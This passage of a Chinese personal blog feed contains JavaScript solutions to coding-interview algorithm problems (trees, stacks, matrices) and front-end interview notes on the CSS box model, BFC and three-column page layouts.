class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">      <span class="comment">//如果找到了对应小树的根节点的点</span></div><div class="line">    <span class="keyword">if</span> (root1.<span class="keyword">val</span> == root2.<span class="keyword">val</span>) &#123;</div><div class="line">      <span class="comment">//以这个根节点为起点判断大树是否包含小树</span></div><div class="line">      <span class="comment">// 如果有相同的值，就递归判断下面的 子树 是不是也相等</span></div><div class="line">        <span class="keyword">return</span> isSubtree(root1.left, root2.left)</div><div class="line">          &amp;&amp; isSubtree(root1.right, root2.right);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、在大树里找到小树的根节点那个数R；<br>2、再判断他们下面的结构是不是一样的</p><blockquote><p>十八、二叉树的镜像 p157<br><strong>描述</strong>：操作给定的二叉树，将其变换为源二叉树的镜像。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function <span class="type">Mirror</span>(root)&#123;</div><div class="line">    <span class="keyword">if</span>(root == null)&#123;</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 下面这个是左右手交换的意思吧</span></div><div class="line">    <span class="keyword">var</span> temp=root.<span class="keyword">left</span>;</div><div class="line">    root.<span class="keyword">left</span>=root.<span class="keyword">right</span>;</div><div class="line">    root.<span class="keyword">right</span>=temp;</div><div class="line">    </div><div class="line">    <span class="keyword">if</span>(root.<span class="keyword">left</span>) <span class="type">Mirror</span>(root.<span class="keyword">left</span>);</div><div class="line">    <span class="keyword">if</span>(root.<span class="keyword">right</span>) <span class="type">Mirror</span>(root.<span class="keyword">right</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p></blockquote><p><strong>思路</strong>：<br>1、前序遍历首先访问 根结点 然后遍历左子树，最后遍历右子树。在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树；<br>2、交换左右手</p><blockquote><p>十九、顺时针打印矩阵 p161</p></blockquote><p><strong>描述</strong>：输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">function printMatrix(<span class="keyword">matrix</span>)&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">matrix</span> == <span class="built_in">null</span> || <span class="keyword">matrix</span>.length == <span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    var <span class="built_in">cols</span> = <span class="keyword">matrix</span>[<span class="number">0</span>].length; <span class="comment">// 纵</span></div><div class="line">    var <span class="built_in">rows</span> = <span class="keyword">matrix</span>.length; <span class="comment">// 横</span></div><div class="line">    var start = <span class="number">0</span>;</div><div class="line">    var result = [];</div><div class="line"></div><div class="line">    <span class="comment">//根据作者的推理，让循环继续的条件是：</span></div><div class="line">    <span class="comment">// rows &gt; startY * 2 且 cols &gt; startX x 2</span></div><div class="line">    <span class="keyword">while</span>(<span class="built_in">rows</span> &gt; start * <span class="number">2</span> &amp;&amp; <span class="built_in">cols</span> &gt; start * <span class="number">2</span>)&#123;</div><div class="line">        var endX = <span class="built_in">cols</span> - <span class="number">1</span> - start,</div><div class="line">            endY = <span class="built_in">rows</span> - <span class="number">1</span> - start;</div><div class="line"></div><div class="line">        <span class="comment">//从左到右打印</span></div><div class="line">        <span class="keyword">for</span>(var i = start; i &lt;= endX; i++)&#123;</div><div class="line">            result.<span class="keyword">push</span>(<span class="keyword">matrix</span>[start][i]);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">//从上到下打印</span></div><div class="line">        <span class="keyword">if</span>(start &lt; endY)&#123;</div><div class="line">            <span class="keyword">for</span>(var i = start + <span class="number">1</span>; i &lt;= endY; i++)&#123;</div><div class="line">                result.<span class="keyword">push</span>(<span class="keyword">matrix</span>[i][endX]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">//从右到左打印</span></div><div class="line">        <span class="keyword">if</span>(start &lt; endX &amp;&amp; start &lt; endY)&#123;</div><div class="line">            <span class="keyword">for</span>(var i = endX - <span class="number">1</span>; i &gt;= start ; i--)&#123;</div><div class="line">                result.<span class="keyword">push</span>(<span class="keyword">matrix</span>[endY][i]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">//从下到上打印</span></div><div class="line">        <span class="keyword">if</span>(start &lt; endX &amp;&amp; start &lt; endY - <span class="number">1</span>)&#123;</div><div class="line">            <span class="keyword">for</span>(var i = endY - <span class="number">1</span>; i &gt;= start + <span class="number">1</span>; i--)&#123;</div><div class="line">               result.<span class="keyword">push</span>(<span class="keyword">matrix</span>[i][start]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        start++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：???</p><blockquote><p>二十、包含min函数的栈 p165</p></blockquote><p><strong>描述</strong>：定义栈的数据结构，请在该类型中实现一个能够得到栈中所含最小元素的min函数（时间复杂度应为O（1））。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> stack = [];</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">node</span>)</span>&#123;</div><div class="line">    stack.push(node);</div><div class="line">&#125;</div><div class="line"><span class="comment">// 删除最后一个元素，并返回它</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">pop</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> stack.length==<span class="number">0</span>?<span class="literal">null</span>:stack.pop();</div><div class="line">&#125;</div><div class="line"><span class="comment">// 取第一个元素</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">top</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> stack.length==<span class="number">0</span>?<span class="literal">null</span>:stack[<span class="number">0</span>];</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">min</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.min.apply(<span class="keyword">this</span>,stack);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>二十一、栈的压入、弹出序列 p168</p></blockquote><p><strong>描述</strong>：输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列1,2,3,4,5是某栈的压入顺序，序列4,5,3,2,1是该压栈序列对应的一个弹出序列，但4,3,5,1,2就不可能是该压栈序列的弹出序列。（注意：这两个序列的长度是相等的）<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">function IsPopOrder(pushV, popV)&#123; // 进栈 出栈</div><div class="line">     <span class="keyword">if</span>(pushV.<span class="built_in">length</span> === <span class="number">0</span> || popV.<span class="built_in">length</span> === <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">return</span>;</div><div class="line">    &#125;</div><div class="line">    // 借用一个辅助的栈</div><div class="line">    <span class="built_in">var</span> temp = [];</div><div class="line">    <span class="built_in">var</span> popIndex = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(<span class="built_in">var</span> i=<span class="number">0</span>;i&lt;pushV.<span class="built_in">length</span>;i++)&#123;</div><div class="line">      // 将原数列依次压入辅助栈，</div><div class="line">        temp.<span class="built_in">push</span>(pushV[i]);</div><div class="line">      // 【栈顶元素】与 所给的【出栈队列】相比，如果 相同 则出栈</div><div class="line">        <span class="keyword">while</span>(temp.<span class="built_in">length</span> &amp;&amp; temp[temp.<span class="built_in">length</span>-<span class="number">1</span>] === popV[popIndex])&#123;</div><div class="line">          temp.<span class="built_in">pop</span>();</div><div class="line">          popIndex++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> (temp.<span class="built_in">length</span> === <span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：【栈顶元素】与 所给的【出栈队列】相比，如果 相同 则出栈</p><blockquote><p>二十二 从上往下打印二叉树 p171</p></blockquote><p><strong>描述</strong>：从上往下打印出二叉树的每个节点，同层节点从左至右打印。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">function PrintFromTopToBottom(root)&#123;</div><div class="line">    var <span class="attr">arr=</span>[];</div><div class="line">    var <span class="attr">data=</span>[];</div><div class="line">    if(root!=null)&#123;</div><div class="line">      // 空数组后面首先跟着的是 根节点</div><div class="line">        arr.push(root);</div><div class="line">    &#125;</div><div class="line">    while(arr.length!=<span class="number">0</span>)&#123;</div><div class="line">      // <span class="keyword">node</span> <span class="title">是节点，root</span> 是根节点</div><div class="line">        var <span class="keyword">node</span><span class="title">=arr</span>.shift();</div><div class="line">        // 第一元素的左子树不为空时，把左子树加在 arr 后面</div><div class="line">        if(<span class="keyword">node</span>.<span class="title">left</span>!=null)&#123;</div><div class="line">            arr.push(<span class="keyword">node</span>.<span class="title">left</span>);</div><div class="line">        &#125;</div><div class="line">        if(<span class="keyword">node</span>.<span class="title">right</span>!=null)&#123;</div><div class="line">            arr.push(<span class="keyword">node</span>.<span class="title">right</span>);</div><div class="line">        &#125;</div><div class="line">        // 首先取得了 arr 的第一个节点 <span class="keyword">node</span><span class="title">，接着是 左子节点 ，最后是右子节点</span></div><div class="line">        // 这个过程是循环的，不断的是 首 -- 左 -- 右</div><div class="line">        // 所以为什么需要一个 data 空数组？？？</div><div class="line">        data.push(<span class="keyword">node</span>.<span class="title">val</span>);</div><div class="line">    &#125;</div><div class="line">    return data;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>引申一下：打印前序遍历会吗？中序会吗？</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;【&lt;a href=&quot;https://github.com/wangsiyuan233/NowCoder&quot;&gt;源码地址&lt;/a&gt;】 || 【&lt;a href=&quot;https://www.nowcoder.com/ta/coding-interviews?page=1&quot;&gt;代码调试&lt;/a&gt;】&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;十二、数值的整数次方 p110&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;描述&lt;/strong&gt;：给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Power&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;x,n&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(n &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123; &lt;span class=&quot;comment&quot;&gt;//指数 n 小于 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(x &amp;lt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123; &lt;span class=&quot;comment&quot;&gt;//底数 x 小于等于 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Error&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;分母不能小于等于0&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&quot;comment&quot;&gt;//底数 x 大于 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(-n % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123; &lt;span class=&quot;comment&quot;&gt;//指数 n 的绝对值是奇数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;/(Power(x,-n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) * x);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;span class=&quot;comment&quot;&gt;//指数 n 的绝对值是偶数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; r = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;/Power(x,-n/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; r * r;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(n == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;span class=&quot;comment&quot;&gt;//指数 n 等于 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;span class=&quot;comment&quot;&gt;//指数 n 大于 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(n % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123; &lt;span class=&quot;comment&quot;&gt;//指数 n 是奇数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; Power(x,n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) * x;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;span class=&quot;comment&quot;&gt;//指数 n 是偶数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; r = Power(x,n/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; r * r;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路&lt;/strong&gt;：分类讨论&lt;br&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="wangsiyuan233.github.io/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>一面知识块(2)-- CSS盒模型</title>
    <link href="wangsiyuan233.github.io/2018/09/24/78%E4%B8%80%E9%9D%A2%E7%9F%A5%E8%AF%86%E5%9D%97-2/"/>
    <id>wangsiyuan233.github.io/2018/09/24/78一面知识块-2/</id>
    <published>2018-09-24T08:22:25.000Z</published>
    <updated>2018-10-01T00:57:56.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>谈谈你对CSS盒模型的认识</p></blockquote><p>一、基本概念<br>1、标准模型：宽高就是 content 的宽高<br>2、IE模型：<code>content + border + padding</code> (没有margin<br><a id="more"></a><br>二、怎么设置两种模型<br>1、标准模型：<code>box-sizing:content-box;</code>（默认）<br>2、IE模型：<code>box-sizing:border-box;</code></p><p>三、JS如何设置获取盒模型对应的宽和高<br>1、<code>dom.style.width/height</code><br>只能用于写在 <code>&lt;html&gt;</code> 尖括号里面的宽高，对于 <code>&lt;style&gt;</code> 和 link 外链表没用<br>2、<code>dom.currentStyle.width/height</code><br>都可以用，但是只支持 IE<br>3、<code>window.getComputedStyle.width/height</code><br>都可以兼容<br>4、<code>dom.getBoundingClientRect().width/height</code><br>计算元素的绝对位置,根据视窗（左上角），拿到 l-r-t-b</p><p>四、根据盒模型解释边距重叠<br>父子元素边距重叠，兄弟元素重叠，引出了BFC</p><p>五、BFC<br>概念：块级元素上下文<br>1、在BFC垂直方向上的边距会发生重叠<br>2、BFC的区域与浮动元素重叠<br>3、是一个独立的元素，内外元素互不影响<br>4、浮动元素不参与计算<br>创建BFC:【float:none】【overflow:hidden】【position不是relative,也不是static】</p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;谈谈你对CSS盒模型的认识&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一、基本概念&lt;br&gt;1、标准模型：宽高就是 content 的宽高&lt;br&gt;2、IE模型：&lt;code&gt;content + border + padding&lt;/code&gt; (没有margin&lt;br&gt;
    
    </summary>
    
    
      <category term="一面知识块" scheme="wangsiyuan233.github.io/tags/%E4%B8%80%E9%9D%A2%E7%9F%A5%E8%AF%86%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>一面知识块（1）-- 页面布局</title>
    <link href="wangsiyuan233.github.io/2018/09/23/77%E4%B8%80%E9%9D%A2%E7%9F%A5%E8%AF%86%E5%9D%97-1/"/>
    <id>wangsiyuan233.github.io/2018/09/23/77一面知识块-1/</id>
    <published>2018-09-23T10:35:09.000Z</published>
    <updated>2018-09-24T08:10:35.541Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>假设高度已知，请写出三栏布局，左右各300px，中间自适应</p></blockquote><p><strong>解法一：浮动布局</strong></p><p><a href="http://js.jirengu.com/duzotakuse/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、 在 <code>div</code> 里面，并不是按照 左中右 的顺序来写<br>2、 给3个 <code>div</code> 最小高度<br>3、 左浮 + 右浮<br>4、 缺点是压缩太小时，中间的字会漏下来，需要清除浮动<br><a id="more"></a><br><strong>解法二：绝对定位</strong></p><p><a href="http://js.jirengu.com/liwaluguji/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结-1"><a href="#★30s总结-1" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、绝对定位就是按顺序写<br>2、中间到左边多少，中间到右边多少<br>3、每个 <code>div</code> 是 <code>absolute</code>，容器是 <code>relative</code><br>4、缺点是脱离了文档流</p><p><strong>解法三：flex布局</strong></p><p><a href="http://js.jirengu.com/domoviyevo/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结-2"><a href="#★30s总结-2" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、容器是 <code>display:flex;</code><br>2、自适应是 <code>flex:1;</code><br>3、拖动时也没有漏下来<br>4、那么缺点一定是不兼容IE吧</p><p><strong>解法四：表格布局</strong></p><p><a href="http://js.jirengu.com/ronoxigemu/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结-3"><a href="#★30s总结-3" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、容器里是 <code>display:table；</code><br>2、各个 <code>div</code> 里是 <code>display:table-cell;</code><br>3、优点是兼容性好<br>4、缺点是压缩以后，所有的格子都会变长</p><p><strong>解法五：网格布局</strong></p><p><a href="http://js.jirengu.com/rogilehema/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结-4"><a href="#★30s总结-4" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、看起来挺清爽的<br>2、设置网格的行和咧</p><h2 id="去掉高度已知，哪种解法会崩？"><a href="#去掉高度已知，哪种解法会崩？" class="headerlink" title="去掉高度已知，哪种解法会崩？"></a>去掉高度已知，哪种解法会崩？</h2><p>只有 <code>table</code> 和 <code>flex</code> 还可以用</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;假设高度已知，请写出三栏布局，左右各300px，中间自适应&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;解法一：浮动布局&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://js.jirengu.com/duzotakuse/1/edit?html,css,output&quot;&gt;【看代码点我】&amp;gt;&amp;gt;&amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;★30s总结&quot;&gt;&lt;a href=&quot;#★30s总结&quot; class=&quot;headerlink&quot; title=&quot;★30s总结&quot;&gt;&lt;/a&gt;★30s总结&lt;/h2&gt;&lt;p&gt;1、 在 &lt;code&gt;div&lt;/code&gt; 里面，并不是按照 左中右 的顺序来写&lt;br&gt;2、 给3个 &lt;code&gt;div&lt;/code&gt; 最小高度&lt;br&gt;3、 左浮 + 右浮&lt;br&gt;4、 缺点是压缩太小时，中间的字会漏下来，需要清除浮动&lt;br&gt;
    
    </summary>
    
    
      <category term="一面知识块" scheme="wangsiyuan233.github.io/tags/%E4%B8%80%E9%9D%A2%E7%9F%A5%E8%AF%86%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>剑指offer(1)--JavaScript版(T01-T11)</title>
    <link href="wangsiyuan233.github.io/2018/09/19/74%E5%89%91%E6%8C%87offer-1/"/>
    <id>wangsiyuan233.github.io/2018/09/19/74剑指offer-1/</id>
    <published>2018-09-19T00:40:56.000Z</published>
    <updated>2018-10-05T07:20:52.822Z</updated>
    
    <content type="html"><![CDATA[<p>【<a href="https://github.com/wangsiyuan233/NowCoder" target="_blank" rel="external">源码地址</a>】 || 【<a href="https://www.nowcoder.com/ta/coding-interviews?page=1" target="_blank" rel="external">代码调试</a>】</p><blockquote><p>一、 二维数组中的查找 p44</p></blockquote><p><strong>描述</strong>：在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Find</span><span class="params">(target, array)</span> </span>&#123;</div><div class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;<span class="comment">// column 竖列</span></div><div class="line">  <span class="keyword">let</span> j = <span class="keyword">array</span>[i].length - <span class="number">1</span>; <span class="comment">// row 横行</span></div><div class="line">  <span class="keyword">while</span> (i &lt; <span class="keyword">array</span>.length &amp;&amp; j &gt;= <span class="number">0</span>)&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">array</span>[i][j] &lt; target) &#123;</div><div class="line">      i++;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">array</span>[i][j] &gt; target)&#123;</div><div class="line">      j--;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：通过对 <code>i</code> 和 <code>j</code> 的设置可以得出，最先定位的点是在矩形的左下角，如果某数比目标数小，则向右移动一个单位；如果比目标数大，就向上移动一个单位，直到最后找到这个数（<code>true</code>），没找到就是 <code>false</code><br><a id="more"></a></p><blockquote><p>二、 替换空格 p51</p></blockquote><p><strong>描述</strong>：请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> <span class="title">changeSpace</span>(str)&#123; </div><div class="line"><span class="keyword">return</span> <span class="type">str.replace(/\s/g,'%20/)</span> </div><div 